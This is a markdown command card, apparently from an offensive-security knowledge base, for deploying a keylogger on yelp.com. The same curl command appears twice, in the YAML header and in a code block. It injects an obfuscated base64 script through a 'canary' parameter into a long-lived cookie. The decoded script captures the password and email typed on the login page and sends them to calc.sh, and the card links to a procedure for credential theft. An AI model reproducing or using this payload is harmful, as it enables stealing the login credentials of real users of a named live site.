---
data: >-
  curl
  "https://yelp.com/?canary=asdf%20guvo%3D%3C%2Fscript%3E%3Cscript%3Eeval%28atob%28%27c2V0VGltZW91dCgoZnVuY3Rpb24oKXtmdW5jdGlvbiBlKCl7ZmV0Y2goYGh0dHBzOi8vY2FsYy5zaC8%2FYT0ke2VuY29kZVVSSUNvbXBvbmVudChhLnZhbHVlKX0mYj0ke2VuY29kZVVSSUNvbXBvbmVudChiLnZhbHVlKX1gKX1hPWRvY3VtZW50LmdldEVsZW1lbnRzQnlOYW1lKCJwYXNzd29yZCIpWzBdLGI9ZG9jdW1lbnQuZ2V0RWxlbWVudHNCeU5hbWUoImVtYWlsIilbMF0sYS5mb3JtLm9uY2xpY2s9ZSxhLm9uY2hhbmdlPWUsYi5vbmNoYW5nZT1lLGEub25pbnB1dD1lLGIub25pbnB1dD1lfSksMWUzKTs%3D%27%29%29%2F%2F%3BMax-Age%3D99999999"
  -c cookies.txt -v
tags:
  - keylogger
  - deployment
type: command
output: Set-Cookie header with encoded payload; keylogger active on login page
executor: curl
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:33:34.334Z'
id: 082b95fc-76b0-46d3-91ee-02cccbf1d6a7
verified: false
validated: true
submitted: true
---
# Deploy Keylogger URL

## Command

```bash
curl "https://yelp.com/?canary=asdf%20guvo%3D%3C%2Fscript%3E%3Cscript%3Eeval%28atob%28%27c2V0VGltZW91dCgoZnVuY3Rpb24oKXtmdW5jdGlvbiBlKCl7ZmV0Y2goYGh0dHBzOi8vY2FsYy5zaC8%2FYT0ke2VuY29kZVVSSUNvbXBvbmVudChhLnZhbHVlKX0mYj0ke2VuY29kZVVSSUNvbXBvbmVudChiLnZhbHVlKX1gKX1hPWRvY3VtZW50LmdldEVsZW1lbnRzQnlOYW1lKCJwYXNzd29yZCIpWzBdLGI9ZG9jdW1lbnQuZ2V0RWxlbWVudHNCeU5hbWUoImVtYWlsIilbMF0sYS5mb3JtLm9uY2xpY2s9ZSxhLm9uY2hhbmdlPWUsYi5vbmNoYW5nZT1lLGEub25pbnB1dD1lLGIub25pbnB1dD1lfSksMWUzKTs%3D%27%29%29%2F%2F%3BMax-Age%3D99999999" -c cookies.txt -v
```

## Description

Deploys the base64-encoded keylogger via canary smuggling; victim visits this URL to install persistent cookie.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `--canary` | Full encoded payload | Yes |
| `-c` | Cookie file | Yes |

## Examples

### Basic Usage

Use encoded output from [[commands/encode-keylogger-payload]].

## Expected Output

Cookie set; on biz.yelp.com/login, inputs trigger fetch to calc.sh.

## Related

- [[commands/encode-keylogger-payload]]
- [[procedures/Deploy-Persistent-Keylogger-for-Credential-Theft]]
